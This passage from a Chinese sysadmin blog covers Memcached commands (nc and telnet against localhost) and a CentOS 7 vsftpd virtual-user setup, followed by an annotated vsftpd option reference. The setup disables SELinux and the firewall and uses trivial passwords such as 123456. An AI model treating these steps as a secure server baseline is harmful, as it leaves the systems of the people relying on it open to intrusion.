11211\rSTORED\r通过printf配合nc从Memcached中读取数据，命令如下：\n$ printf \u0026quot;get key1\\r\\n\u0026quot;|nc 127.0.0.1 11211\rVALUE key1 0 6\rzhangs # 这就是读到的key1对应额值\rEND\r通过printf配合nc从Memcached中删除数据\n$ printf \u0026quot;delete key1\\r\\n\u0026quot;|nc 127.0.0.1 11211 DELETED #←出现DELETED表示成功删除key1及对应的数据\r$ printf \u0026quot;get key1\\r\\n\u0026quot;|nc 127.0.0.1 11211 END\r⚠ 提示：推荐使用上述方法测试操作Memcached 通过telnet命令写入数据时，具体步骤如下。\n通过telnet向Memcached写入数据\n$ telnet 127.0.0.1 11211\rTrying 127.0.0.1...\rConnected to 127.0.0.1.\rEscape character is '^]'.\radd id 0 0 5\t12345\t#← 写入数据\rSTORED\radd id 0 0 3\t123\rNOT_STORED\t#← 若key存在则报如下错误\rset name 0 0 6 #← 写入数据，如果key不存在则创建key，如果存在则更改key的value值\r张三\t#← 中文，每个字占3个bytes\rSTORED\rget name\rVALUE name 0 6\r张三\rEND\rget id\rVALUE id 0 5\r12345\rEND\rset id 0 0 1\t#← 写入数据，如果key不存在则创建key，如果存在则更改key的value值\r2\rSTORED\rget id\rVALUE id 0 1\r2\rEND\rincr/decr\nset key 0 0 1\r9\rSTORED\rget key\rVALUE key 0 1\r9\rEND\rincr key 1\r10\tget key VALUE key 0 2\t#← 对整型增加后对应的bytes也增加\r10\tEND\rget key\rVALUE key 0 1\r1\rEND\rdecr key 1\r0\rdecr key 1\r0\r⚠ 提示：telnet连接后如果输入字符错了，可以通过Ctrl+Backspace删除 7.3.3 操作Memcached相关命令的语法 以下为操作Memcached的相关命令基础语法\nset\tkey1\t0 0\t6\r[command name] [key] [flags] [exptime] [bytes]\r[datablock]\\r\\n\r[status]\\r\\n\r表7-3 Memcached相关命令详细说明\n命令 说明 command name set：无论如何都进行写入数据，会覆盖老数据\nadd：只有对应数据不存在时才添加数据\nrepalce：只有数据存在时进行替换数据\ndelete [second] 加秒数之后，被删除的key N秒内不能再用，作用：让网站的页面也代谢完毕\nappend往后追加：prepend[key]datablock[status]?\nprepend往前追加：prepend[key]datablock[status]\ncas按版本号更换\nincr key num 增加一个值的大小。\ndecr key num 减少一个值的大小。\nincr decr操作将值进行32位无符号计算 0-232-1范围内\n应用场景，限时秒杀中库存量，先给抢中者分发订单号，数据低谷期将数据写入数据库 key 普通字符串，要求小于250个字符，不包含空格和控制字符 flags 客户端用来标识数据格式和数值，如json、xml、压缩、数组等 exptime 存活时间s，0为永久有效：编译时默认为30天。小于30天，60x60x24x30为秒数，大于30天为unix timestamp 如：团购网站，某团到中午12:00失效。 bytes byte字节数，不包含\\r\\n，根据长度截取存/取的字符串，可以是0，即存空串 datablock 文本行，以\\r\\n结尾，当然可以包含\\r或\\n status STORED/NOT_STORED/EXISTS/NOT_FOUNDERROR/CLIENT_ERROR/SERVER_ERROR服务器端会关闭连接以修复。 事例1：向memcached中插入数据\nadd id 0 0 5\r12345\rSTORED\rset name 0 0 6\r张三\rSTORED\rget name\rVALUE name 0 6\r张三\rEND\rget id\rVALUE id 0 5\r12345\rEND\rset id 0 0 1\r2\rSTORED\rget id\rVALUE id 0 1\r2\rEND\r7.3.4 关闭Memcached 单实例关闭Memcached的方法如下：\nkillall memcached 或 pkill\r若启动了多个实例Memcached，使用killall或pkill方式就会同时关闭这些实例！因此最好在启动时增加-P参数指定固定的pid文件，这样便于管理不同的实例。实例如下\nmemcached -m 16m -p 11211 -d -u root -c 8192 -P /var/run/memcached/11211.pid\rmemcached -m 16m -p 11211 -d -u root -c 8192 -P /var/run/memcached/11212.pid\r此时，即可以通过kill命令关闭Memcached\nkill `cat /var/run/memcached/11211.pid`\r关闭Memcached的方法小结如下：\nps -ef|grep memcached|grep -v grep|awk '{print $2}'|xargs kill\rkill `cat /var/run/memcached/11211.pid`\rpkill memcached\rkillall memcached\r7.3.5 企业工作场景中如何配置Memcached 在企业实际工作中，一般是开发人员提出需求，说要不熟一个Memcached数据缓存。运维人员在接到这个不确定的需求后，需要和开发人员深入沟通，进而确定要将内存指定为多大，或者和开发人员商量如何根据具体业务来指定内存缓存的大小。此外，还要确定业务的重要性，进而决定是否采取负载均衡、分布式缓存集群等架构，最后确定使用多大的并发连接数等。\n对于运维人员，部署Memcached一般就是安装Memcached服务端，把服务启动起来，最好监控，配好开机自启动，基本上就OK了，客户端的PHP程序环境一般在安装LNMP环境时都会提前安装Memcached客户端插件，Java程序环境下，开发人员会用第三方的JAR包直接连接Memcached服务。\n","permalink":"https://www.oomkill.com/2016/09/memcached/","summary":"","title":"memcached从入门到精通"},{"content":"配置防火墙，开启FTP服务器需要的端口 CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。\n关闭firewall： systemctl stop firewalld.service #停止firewall\rsystemctl disable firewalld.service #禁止firewall开机启动\r安装iptables防火墙 yum install iptables-services # 安装\rvi /etc/sysconfig/iptables # 编辑防火墙配置文件\r# Firewall configuration written by system-config-firewall\r# Manual customization of this file is not recommended.\r*filter\r:INPUT ACCEPT [0:0]\r:FORWARD ACCEPT [0:0]\r:OUTPUT ACCEPT [0:0]\r-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\r-A INPUT -p icmp -j ACCEPT\r-A INPUT -i lo -j ACCEPT\r-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\r-A INPUT -m state --state NEW -m tcp -p tcp --dport 21 -j ACCEPT\r-A INPUT -m state --state NEW -m tcp -p tcp --dport 10060:10090 -j ACCEPT\r-A INPUT -j REJECT --reject-with icmp-host-prohibited\r-A FORWARD -j REJECT --reject-with icmp-host-prohibited\rCOMMIT\r:wq! #保存退出\rsystemctl restart iptables.service #最后重启防火墙使配置生效\rsystemctl enable iptables.service #设置防火墙开机启动\r说明：\n21端口是ftp服务端口；10060到10090是Vsftpd被动模式需要的端口，可自定义一段大于1024的tcp端口。\n关闭SELINUX vi /etc/selinux/config\r#SELINUX=enforcing # 注释掉\r#SELINUXTYPE=targeted # 注释掉\rSELINUX=disabled # 增加\r:wq! #保存退出\rsetenforce 0 # 使配置立即生效\r安装vsftpd # 安装vsftpd\ryum install -y vsftpd # 安装vsftpd虚拟用户配置依赖包\ryum install -y psmisc net-tools systemd-devel libdb-devel perl-DBI systemctl start vsftpd.service # 启动\rsystemctl enable vsftpd.service # 设置vsftpd开机启动\r配置vsftp服务器 备份默认配置文件\ncp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf-bak\r执行以下命令进行设置\nsed -i \u0026quot;s/anonymous_enable=YES/anonymous_enable=NO/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#anon_upload_enable=YES/anon_upload_enable=NO/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#anon_mkdir_write_enable=YES/anon_mkdir_write_enable=YES/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#chown_uploads=YES/chown_uploads=NO/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#async_abor_enable=YES/async_abor_enable=YES/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#ascii_upload_enable=YES/ascii_upload_enable=YES/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#ascii_download_enable=YES/ascii_download_enable=YES/g\u0026quot; '/etc/vsftpd/vsftpd.conf'\rsed -i \u0026quot;s/#ftpd_banner=Welcome to blah FTP service./ftpd_banner=Welcome to FTP service./g\u0026quot; '/etc/vsftpd/vsftpd.conf'\recho -e \u0026quot;use_localtime=YES\\nlisten_port=21\\nchroot_local_user=YES\\nidle_session_timeout=300\r\\ndata_connection_timeout=1\\nguest_enable=YES\\nguest_username=vsftpd\r\\nuser_config_dir=/etc/vsftpd/vconf\\nvirtual_use_local_privs=YES\r\\npasv_min_port=10060\\npasv_max_port=10090\r\\naccept_timeout=5\\nconnect_timeout=1\u0026quot; \u0026gt;\u0026gt; /etc/vsftpd/vsftpd.conf\r这是配置好的配置文件\nanonymous_enable=NO\rlocal_enable=YES\rwrite_enable=YES\rlocal_umask=022\ranon_upload_enable=NO\ranon_mkdir_write_enable=YES\rdirmessage_enable=YES\rxferlog_enable=YES\rconnect_from_port_20=YES\rchown_uploads=NO\rxferlog_std_format=YES async_abor_enable=YES\rascii_upload_enable=YES\rascii_download_enable=YES\rftpd_banner=Welcome to FTP service.\rlisten=NO\rlisten_ipv6=YES\rpam_service_name=vsftpd\ruserlist_enable=YES\rtcp_wrappers=YES\ruse_localtime=YES\rlisten_port=21\rchroot_local_user=YES\ridle_session_timeout=300\rdata_connection_timeout=1\rguest_enable=YES\rguest_username=vsftpd\ruser_config_dir=/etc/vsftpd/vconf\rvirtual_use_local_privs=NO\rpasv_min_port=10060\rpasv_max_port=10090\raccept_timeout=5\rconnect_timeout=1\r建立虚拟用户名单文件 touch /etc/vsftpd/virtualUsers\r# 编辑虚拟用户名单文件：（第一行账号，第二行密码，注意：不能使用root做用户名，系统保留）\rvi /etc/vsftpd/virtualUsers\rpublic\r123456\radmin\r111111\r:wq! #保存退出\r生成虚拟用户数据文件 db_load -T -t hash -f /etc/vsftpd/virtusers /etc/vsftpd/virtualUsers.db\rchmod 600 /etc/vsftpd/virtualUsers.db #设定PAM验证文件，并指定对虚拟用户数据库文件进行读取\r在/etc/pam.d/vsftpd的文件头部加入以下信息 # 修改前先备份 cp /etc/pam.d/vsftpd /etc/pam.d/vsftpdbak\rvi /etc/pam.d/vsftpd\rauth sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/virtualUsers\raccount sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/virtualUsers\r注：\n在后面加入无效 如果系统为32位，上面改为lib，否则配置失败\n新建系统用户vsftpd 用户目录为/home/ftp 用户登录终端设为/bin/false(即使之不能登录系统)\nuseradd vsftpd -d /home/ftp -s /bin/false\rchown vsftpd:vsftpd /home/ftp -R\rchown www:www /home/www-R # 如果虚拟用户的宿主用户为www，需要这样设置。\r建立虚拟用户个人Vsftp的配置文件 # 创建虚拟用户用户的权限配置文件\rmkdir /etc/vsftpd/vconf\r# 进入该目录\rcd /etc/vsftpd/vconf\r# 创建public与admin两个用户的配置文件\rtouch public admin\r# 编辑用户admin配置文件，其他的跟这个配置文件类似\rvi admin\rlocal_root=/home/ftp/\rwrite_enable=YES\ranon_world_readable_only=NO\ranon_upload_enable=YES\ranon_mkdir_write_enable=YES\ranon_other_write_enable=YES\rallow_writeable_chroot=YES\r最后重启vsftpd服务器 systemctl restart vsftpd.service\r备注 guest_username=vsftpd #指定虚拟用户的宿主用户（就是我们前面新建的用户） guest_username=www #如果ftp目录是指向网站根目录，用来上传网站程序，可以指定虚拟用户的宿主用户为nginx运行账户www，可以避免很多权限设置问题。 vsftpd配置文件详解 allow_anon_ssl NO\r# 只有ss1_enable激活了才可以启用此项。如果设置为YES，匿名用户将容许使用安全的SSL连接服务器。\ranon_mkdir_write_enable NO\r# 如果设为YES，匿名用户将容许在指定的环境下创建新目录。如果此项要生效，那么配置write_enable必须被激活，并且匿名用户必须在其父目录有写权限。\ranon_other_write_enable NO\r# 如果设置为YES，匿名用户将被授予较大的写权限，例如删除和改名。一般不建议这么做，除非想完全授权。也可以和cmds_allowed配合来实现控制，这样可以达到文件续传功能。\ranon_upload_enable NO\r# 如果设为YES，匿名用户就容许在指定的环境下上传文件。如果此项要生效，那么配置write_enable必须激活。并且匿名用户必须在相关目录有写权限。\ranon_world_readable_only YES\r# 启用的时候，匿名用户只容许下载完全可读的文件，这也就容许了ftp用户拥有对文件的所有权，尤其是在上传的情况下。\ranonymous_enable YES\r# 控制是否容许匿名用户登录。如果容许，那么“ftp”和“anonymous”都将被视为“anonymous\u0026quot;而容许登录。\rascii_download_enable NO\r# 启用时，用户下载时将以ASCII模式传送文件。\rascii_upload_enable NO\r# 启用时，用户上传时将以ASCII模式传送文件。\rasync_abor_enable NO\r# 启用时，一个特殊的FTP命令\u0026quot;async ABOR”将容许使用。只有不正常的FTP客户端要使用这一点。而且，这个功能又难于操作，所以，默认是把它关闭了。但是，有些客户端在取消一个传送的时候会被挂死(注：估计是客户端无响应了)，那你只有启用这个功能才能避免这种情况。\rbackground NO\r# 启用时，并且VSFTPD是“listen”模式启动的(注：就是standalone模式)，VSFTPD将把监听进程置于后台。但访问VSFTPD时，控制台将立即被返回到SHELL。\rcheck_shell YES\r# 注意：这个选项只对非PAM结构的VSFTPD才有效。如果关闭，VSFTPD将不检查/etc/shells以判定本地登录的用户是否有一个可用的SHELL。\rchmod_enable YES\r# 启用时，将容许使用SITE CHMOD命令。注意，这只能用于本地用户。匿名用户绝不能使用SITE CHMOD。\rchown_uploads NO\r# 如果启用，所以匿名用户上传的文件的所有者将变成在chown_username里指定的用户。这对管理FTP很有用，也许也对安全有益。\rchroot_list_enable NO\r# 如果激活，你要提供一个用户列表，表内的用户将在登录后被放在其home目录，锁定在虚根下(注：进入FTP后，PWD一下，可以看到当前目录是\u0026quot;/\u0026quot;, 这就是虚根。是FTP的根目录，并非FTP服务器系统的根目录)。如果chroot_local_user设为YES后，其含义会发生一点变化。在这种情况下，这个列表内的用户将不被锁定在虚根下。默认情况下，这个列表文件是/etc/vsftpd.chroot_list, 但你也可以通过修改chroot_list_file来改变默认值。\rchroot_local_user NO\r# 如果设为YES，本地用户登录后将被(默认地)锁定在虚根下，并被放在他的home目录下。\r警告：这个配置项有安全的意味，特别是如果用户有上传权限或者可使用SHELL的话。在你确定的前提下，再启用它。\r注意，这种安全暗示并非只存在于VSFTPD，其实是广泛用于所有的希望把用户锁定在虚根下的FTP软件。\rconnect_from_port_20 NO\r# 这用来控制服务器是否使用20端口号来做数据传输。为安全起见，有些客户坚持启用。相反，关闭这一项可以让VSFTPD更加大众化。\rdeny_email_enable NO\r# 如果激活，你要提供一个关于匿名用户的密码E-MAIL表(注：我们都知道，匿名用户是用邮件地址做密码的)以阻止以这些密码登录的匿名用户。默认情况下，这个列表文件是/etc/vsftpd.banner_emails，但你也可以通过设置banned_email_file来改变默认值。\rdirlist_enable YES\r# 如果设置为NO，所有的列表命令(注：如ls)都将被返回“permission denied”提示。\rdirmessage_enable NO\r# 如果启用，FTP服务器的用户在首次进入一个新目录的时候将显示一段信息。默认情况下，会在这个目录中查找.message文件，但你也可以通过更改message_file来改变默认值。\rdownload_enable YES\r# 如果设为NO，下载请求将返回“permission denied”。\rdual_log_enable NO\r# 如果启用，两个LOG文件会各自产生，默认的是/var/log/xferlog和/var/log/vsftpd.log。前一个是wu-ftpd格式的LOG，能被通用工具分析。后一个是VSFTPD的专用LOG格式。\rforce_dot_files NO\r# 如果激活，即使客户端没有使用“a”标记，(FTP里)以.开始的文件和目录都会显示在目录资源列表里。但是把\u0026quot;.\u0026quot;和\u0026quot;..\u0026quot;不会显示。(注：即LINUX下的当前目录和上级目录不会以‘.’或‘..’方式显示)。\rforce_local_data_ssl YES\r# 只有在ssl_enable激活后才能启用。如果启用，所有的非匿名用户将被强迫使用安全的SSL登录以在数据线路上收发数据。\rforce_local_logins_ssl YES\r# 只有在ssl_enable激活后才能启用。如果启用，所有的非匿名用户将被强迫使用安全的SSL登录以发送密码。\rguest_enable NO\r# 如果启用，所有的非匿名用户登录时将被视为”游客“，其名字将被映射为guest_username里所指定的名字。\rhide_ids NO\r# 如果启用，目录资源列表里所有用户和组的信息将显示为\u0026quot;ftp\u0026quot;.\rlisten NO\r# 如果启用，VSFTPD将以独立模式(standalone)运行，也就是说可以不依赖于inetd或者类似的东东启动。直接运行VSFTPD的可执行文件一次，然后VSFTPD就自己去监听和处理连接请求了。\rlisten_ipv6 NO\r# 类似于listen参数的功能，但有一点不同，启用后VSFTPD会去监听IPV6套接字而不是IPV4的。这个设置和listen的设置互相排斥。\rlocal_enable NO\r# 用来控制是否容许本地用户登录。如果启用，/etc/passwd里面的正常用户的账号将被用来登录。\rlog_ftp_protocol NO\r# 启用后，如果xferlog_std_format没有被激活，所有的FTP请求和反馈信息将被纪录。这常用于调试(debugging)。\rls_recurse_enable NO\r# 如果启用，\u0026quot;ls -R\u0026quot;将被容许使用。这是为了避免一点点安全风险。因为在一个大的站点内，在目录顶层使用这个命令将消耗大量资源。\rno_anon_password NO\r# 如果启用，VSFTPD将不会向匿名用户询问密码。匿名用户将直接登录。\rno_log_lock NO\r# 启用时，VSFTPD在写入LOG文件时将不会把文件锁住。这一项一般不启用。它对一些工作区操作系统问题，如Solaris / Veritas文件系统共存时有用。因为那在试图锁定LOG文件时，有时候看上去象被挂死(无响应)了。(注：这我也不是很理解。所以翻译未必近乎原意。原文如下：It exists to workaround operating system bugs such as the Solaris / Veritas filesystem combination which has been observed to sometimes exhibit hangs trying to lock log files.)\rone_process_model NO\r# 如果你的LINUX核心是2.4的，那么也许能使用一种不同的安全模式，即一个连接只用一个进程。只是一个小花招，但能提高FTP的性能。请确定需要后再启用它，而且也请确定你的站点是否会有大量的人同时访问。\rpasswd_chroot_enable (注：这段自己看，无语...)\rif enabled, along with\r.BR chroot_local_user\r, then a chroot() jail location may be specified on a per-user basis. Each\ruser's jail is derived from their home directory string in /etc/passwd. The\roccurrence of /./ in the home directory string denotes that the jail is at that\rparticular location in the path.\r默认值：NO\rpasv_enable YES\r# 如果你不想使用被动方式获得数据连接，请设为NO。\rpasv_promiscuous NO\r# 如果你想关闭被动模式安全检查(这个安全检查能确保数据连接源于同一个IP地址)的话，设为YES。确定后再启用它(注：原话是：只有你清楚你在做什么时才启用它!)合理的用法是：在一些安全隧道配置环境下，或者更好地支持FXP时(才启用它)。\rport_enable YES\r# 如果你想关闭以端口方式获得数据连接时，请关闭它。\rport_promiscuous NO\r# 如果你想关闭端口安全检查(这个检查可以确保对外的(outgoing)数据线路只通向客户端)时，请关闭它。确认后再做!\rrun_as_launching_user NO\r# 如果你想让一个用户能启动VSFTPD的时候，可以设为YES。当ROOT用户不能去启动VSFTPD的时候会很有用(注：应该不是说ROOT用户没有权限启动VSFTPD，而是因为别的，例如安全限制，而不能以ROOT身份直接启动VSFTPD)。强烈警告!!别启用这一项，除非你完全清楚你在做什么(:无语....)!!!随意地启动这一项会导致非常严重的安全问题，特别是VSFTPD没有或者不能使用虚根技术来限制文件访问的时候(甚至VSFTPD是被ROOT启动的)。有一个愚蠢的替代方案是启用deny_file，将其设置为{/*,*..*}等，但其可靠性却不能和虚根相比，也靠不住。\r如果启用这一项，其他配置项的限制也会生效。例如，非匿名登录请求，上传文件的所有权的转换，用于连接的20端口和低于1024的监听端口将不会工作。其他一些配置项也可能被影响。\rsecure_email_list_enable NO\r# 如果你想只接受以指定E-MAIL地址登录的匿名用户的话，启用它。这一般用来在不必要用虚拟用户的情况下，以较低的安全限制去访问较低安全级别的资源。如果启用它，匿名用户除非用在email_password_file里指定的E-MAIL做为密码，否则不能登录。这个文件的格式是一个密码一行，而且没有额外的空格(注：whitespace,译为空格，不知道是否正确)。\r默认的文件名是：/etc/vsftpd.email_passwords.\rsession_support NO\r# 这将配置是否让VSFTPD去尝试管理登录会话。如果VSFTPD管理会话，它会尝试并更新utmp和wtmp。它也会打开一个pam会话(pam_session)，直到LOGOUT才会关闭它，如果使用PAM进行认证的话。如果你不需要会话纪录，或者想VSFTPD运行更少的进程，或者让它更大众化，你可以关闭它。注：utmp和wtmp只在有PAM的环境下才支持。\rsetproctitle_enable NO\r# 如果启用，VSFTPD将在系统进程列表中显示会话状态信息。换句话说，进程名字将变成VSFTPD会话当前正在执行的动作(等待，下载等等)。为了安全目的，你可以关闭这一项。\rssl_enable NO\r# 如果启用，vsftpd将启用openSSL，通过SSL支持安全连接。这个设置用来控制连接(包括登录)和数据线路。同时，你的客户端也要支持SSL才行。注意：小心启用此项.VSFTPD不保证OpenSSL库的安全性。启用此项，你必须确信你安装的OpenSSL库是安全的。\rssl_sslv2 NO\r# 要激活ssl_enable才能启用它。如果启用，将容许SSL V2协议的连接。TLS V1连接将是首选。\rssl_sslv3 NO\r# 要激活ssl_enable才能启用它。如果启用，将容许SSL V3协议的连接。TLS V1连接将是首选。\rssl_tlsv1 YES\r# 要激活ssl_enable才能启用它。如果启用，将容许TLS V1协议的连接。TLS V1连接将是首选。\rsyslog_enable NO\r# 如果启用，系统log将取代vsftpd的log输出到/var/log/vsftpd.log.FTPD的了log工具将不工作。\rtcp_wrappers NO\r# 如果启用，vsftpd将被tcp_wrappers所支持。进入的(incoming)连接将被tcp_wrappers访问控制所反馈。如果tcp_wrappers设置了VSFTPD_LOAD_CONF环境变量，那么vsftpd将尝试调用这个变量所指定的配置。\rext_userdb_names NO\r# 默认情况下，在文件列表中，数字ID将被显示在用户和组的区域。你可以编辑这个参数以使其使用数字ID变成文字。为了保证FTP性能，默认情况下，此项被关闭。\rtilde_user_enable NO\r# 如果启用，vsftpd将试图解析类似于~chris/pics的路径名(一个\u0026quot;~\u0026quot;(tilde)后面跟着个用户名)。注意，vsftpd有时会一直解析路径名\u0026quot;~\u0026quot;和\u0026quot;~/\u0026quot;(在这里，～被解析成内部登录目录)。～用户路径(～user paths)只有在当前虚根下找到/etc/passwd文件时才被解析。\ruse_localtime NO\r# 如果启用，vsftpd在显示目录资源列表的时候，在显示你的本地时间。而默认的是显示GMT(格林尼治时间)。通过MDTM FTP命令来显示时间的话也会被这个设置所影响。\ruse_sendfile YES\r# 一个内部设定，用来测试在你的平台上使用sendfile()系统呼叫的相关好处(benefit).\ruserlist_deny YES\r# 这个设置在userlist_enable被激活后能被验证。如果你设置为NO，那么只有在userlist_file里明确列出的用户才能登录。如果是被拒绝登录，那么在被询问密码前，用户就将被系统拒绝。\ruserlist_enable NO\r# 如果启用，vsftpd将在userlist_file里读取用户列表。如果用户试图以文件里的用户名登录，那么在被询问用户密码前，他们就将被系统拒绝。这将防止明文密码被传送。参见userlist_deny。\rvirtual_use_local_privs NO\r# 如果启用，虚拟用户将拥有和本地用户一样的权限。默认情况下，虚拟用户就拥有和匿名用户一样的权限，而后者往往有更多的限制(特别是写权限)。\rwrite_enable NO\r# 这决定是否容许一些FTP命令去更改文件系统。这些命令是STOR, DELE, RNFR, RNTO, MKD, RMD, APPE 和 SITE。\rxferlog_enable NO\r# 如果启用，一个log文件将详细纪录上传和下载的信息。默认情况下，这个文件是/var/log/vsftpd.log，但你也可以通过更改vsftpd_log_file来指定其默认位置。\rxferlog_std_format NO\r# 如果启用，log文件将以标准的xferlog格式写入(wu-ftpd使用的格式)，以便于你用现有的统计分析工具进行分析。但默认的格式具有更好的可读性。默认情况下，log文件是在/var/log/xferlog。但是，你可以通过修改xferlog_file来指定新路径。\r数字选项\r# 以下是数字配置项。这些项必须设置为非负的整数。为了方便umask设置，容许输入八进制数，那样的话，数字必须以0开始。\raccept_timeout 60\r# 超时，以秒为单位，设定远程用户以被动方式建立连接时最大尝试建立连接的时间。\ranon_max_rate 0　(无限制)\r# 对于匿名用户，设定容许的最大传送速率，单位：字节/秒。\ranon_umask 077\r# 为匿名用户创建的文件设定权限。注意：如果你想输入8进制的值，那么其中的0不同于10进制的0。\rconnect_timeout 60\r# 超时。单位：秒。是设定远程用户必须回应PORT类型数据连接的最大时间。\rdata_connection_timeout 300\r# 超时，单位：秒。设定数据传输延迟的最大时间。时间一到，远程用户将被断开连接。\rfile_open_mode 0666\r# 对于上传的文件设定权限。如果你想被上传的文件可被执行，umask要改成0777。\rftp_data_port 20\r# 设定PORT模式下的连接端口(只要connect_from_port_20被激活)。\ridle_session_timeout 300\r# 超时。单位：秒。设置远程客户端在两次输入FTP命令间的最大时间。时间一到，远程客户将被断开连接。\rlisten_port 21\r# 如果vsftpd处于独立运行模式，这个端口设置将监听的FTP连接请求。\rlocal_max_rate　0(无限制)\r#　为本地认证用户设定最大传输速度，单位：字节/秒。\rlocal_umask 077\r# 设置本地用户创建的文件的权限。注意：如果你想输入8进制的值，那么其中的0不同于10进制的0。\rmax_clients 0(无限制)\r# 如果vsftpd运行在独立运行模式，这里设置了容许连接的最大客户端数。再后来的用户端将得到一个错误信息。\rmax_per_ip 0(无限制)\r# 如果vsftpd运行在独立运行模式，这里设置了容许一个IP地址的最大接入客户端。如果超过了最大限制，将得到一个错误信息。\rpasv_max_port 0(使用任何端口)\r# 指定为被动模式数据连接分配的最大端口。可用来指定一个较小的范围以配合防火墙。\rpasv_min_port 0(使用任何端口)\r# 指定为被动模式数据连接分配的最小端口。可用来指定一个较小的范围以配合防火墙。\rtrans_chunk_size 0(让vsftpd自行选择)\r# 你一般不需要改这个设置。但也可以尝试改为如8192去减小带宽限制的影响。\r以下是STRING 配置项\ranon_root 无\r# 设置一个目录，在匿名用户登录后，vsftpd会尝试进到这个目录下。如果失败则略过。\rbanned_email_file /etc/vsftpd.banned_emails\r# deny_email_enable启动后，匿名用户如果使用这个文件里指定的E-MAIL密码登录将被拒绝。\rbanner_file 无\r# 设置一个文本，在用户登录后显示文本内容。如果你设置了ftpd_banner，ftpd_banner将无效。\rchown_username ROOT\r# 改变匿名用户上传的文件的所有者。需设定chown_uploads。\rchroot_list_file /etc/vsftpd.chroot_list\r# 这个项提供了一个本地用户列表，表内的用户登录后将被放在虚根下，并锁定在home目录。这需要chroot_list_enable项被启用。如果chroot_local_user项被启用，这个列表就变成一个不将列表里的用户锁定在虚根下的用户列表了。\rcmds_allowed 无\r# 以逗号分隔的方式指定可用的FTP命令(post　login. USER, PASS and QUIT 是始终可用的命令)。\r其他命令将被屏蔽。这是一个强有力的locking down一个FTP服务器的手段。例如：cmds_allowed=PASV,RETR,QUIT(只允许检索文件)\rcmds_allowed=ABOR,APPE,CWD,CDUP,FEAT,LIST,MKD,MDTM,PASS,PASV,PWD,QUIT,RETR,REST,\rSTOR,STRU,TYPE,USER(支持上传和下载的断点续传等命令)。\r详细参考：http://www.nsftools.com/tips/RawFTP.htm\rdeny_file 无\r# 这可以设置一个文件名或者目录名式样以阻止在任何情况下访问它们。并不是隐藏它们，而是拒绝任何试图对它们进行的操作(下载，改变目录层，和其他有影响的操作)。这个设置很简单，而且不会用于严格的访问控制-文件系统权限将优先生效。然而，这个设置对确定的虚拟用户设置很有用。\r# 特别是如果一个文件能多个用户名访问的话(可能是通过软连接或者硬连接)，那就要拒绝所有的访问名。\r# 建议你为使用文件系统权限设置一些重要的安全策略以获取更高的安全性。如deny_file={*.mp3,*.mov,.private}\rdsa_cert_file 无(有一个RSA证书就够了)\r# 这个设置为SSL加密连接指定了DSA证书的位置。\remail_password_file /etc/vsftpd.email_passwords\r# 在设置了secure_email_list_enable后，这个设置可以用来提供一个备用文件。\rftp_username ftp\r# 这是用来控制匿名FTP的用户名。这个用户的home目录是匿名FTP区域的根。\rftpd_banner 无(默认的界面会被显示)\r# 当一个连接首次接入时将现实一个欢迎界面。\rguest_username ftp\r# 参见相关设置guest_enable。这个设置设定了游客进入后，其将会被映射的名字。\rhide_file 无\r# 设置了一个文件名或者目录名列表，这个列表内的资源会被隐藏，不管是否有隐藏属性。但如果用户知道了它的存在，将能够对它进行完全的访问。hide_file里的资源和符合hide_file指定的规则表达式的资源将被隐藏。vsftpd的规则表达式很简单，例如hide_file={*.mp3,.hidden,hide*,h?}\rlisten_address 无\r# 如果vsftpd运行在独立模式下，本地接口的默认监听地址将被这个设置代替。需要提供一个数字化的地址。\rlisten_address6 无\r# 如果vsftpd运行在独立模式下，要为IPV6指定一个监听地址(如果listen_ipv6被启用的话)。需要提供一个IPV6格式的地址。\rlocal_root无\r# 设置一个本地(非匿名)用户登录后，vsftpd试图让他进入到的一个目录。如果失败，则略过。\rmessage_file .message\r# 当进入一个新目录的时候，会查找这个文件并显示文件里的内容给远程用户。dirmessage_enable需启用。\rnopriv_user nobody\r# 这是vsftpd做为完全无特权的用户的名字。这是一个专门的用户，比nobody更甚。用户nobody往往用来在一些机器上做一些重要的事情。\rpam_service_name ftp\r# 设定vsftpd将要用到的PAM服务的名字。\rpasv_address 无(地址将取自进来(incoming)的连接的套接字)\r# 当使用PASV命令时，vsftpd会用这个地址进行反馈。需要提供一个数字化的IP地址。\rrsa_cert_file /usr/share/ssl/certs/vsftpd.pem\r# 这个设置指定了SSL加密连接需要的RSA证书的位置。\rsecure_chroot_dir /usr/share/empty\r# 这个设置指定了一个空目录，这个目录不容许ftp　user写入。在vsftpd不希望文件系统被访问时，目录为安全的虚根所使用。\rssl_ciphers DES-CBC3-SHA\r# 这个设置将选择vsftpd为加密的SSL连接所用的SSL密码。详细信息参见ciphers。\ruser_config_dir 无\r# 这个强大的设置容许覆盖一些在手册页中指定的配置项(基于单个用户的)。用法很简单，最好结合范例。如果你把user_config_dir改为/etc/vsftpd_user_conf，那么以chris登录，vsftpd将调用配置文件/etc/vsftpd_user_conf/chris。\ruser_sub_token 无\r# 这个设置将依据一个模板为每个虚拟用户创建home目录。例如，如果真实用户的home目录通过guest_username为/home/virtual/$USER 指定，并且user_sub_token设置为 $USER ，那么虚拟用户fred登录后将锁定在/home/virtual/fred下。\ruserlist_file /etc/vsftpd.user_list\r# 当userlist_enable被激活，系统将去这里调用文件。\rvsftpd_log_file /var/log/vsftpd.log\r# 只有xferlog_enable被设置，而xferlog_std_format没有被设置时，此项才生效。这是被生成的vsftpd格式的log文件的名字。\r# dual_log_enable和这个设置不能同时启用。如果你启用了syslog_enable，那么这个文件不会生成，而只产生一个系统log.\rxferlog_file /var/log/xferlog\r# 这个设置是设定生成wu-ftpd格式的log的文件名。只有启用了xferlog_enable和xferlog_std_format后才能生效。但不能和dual_log_enable同时启用。\r数字代码 数字代码 意义 110 重新启动标记应答。 120 服务在多久时间内ready。 125 数据链路埠开启，准备传送。 150 文件状态正常，开启数据连接端口。 200 命令执行成功。 202 